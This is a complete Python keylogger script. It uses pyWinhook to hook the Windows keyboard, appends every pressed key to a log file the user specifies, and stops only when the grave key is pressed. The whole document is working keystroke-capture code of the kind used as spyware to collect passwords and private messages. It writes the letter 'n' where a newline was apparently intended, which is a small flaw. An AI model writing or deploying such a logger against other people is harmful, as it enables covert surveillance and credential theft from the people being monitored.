import pyWinhook
import pythoncom

#change this to your log file's path
log_file=r'<input path to writable file here>'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()
#instantiate HookManager class

new_hook=pyWinhook.HookManager()
#listen to all keystrokes

new_hook.KeyDown=OnKeyPress
#hook the keyboard

new_hook.HookKeyboard()

pythoncom.PumpMessages()
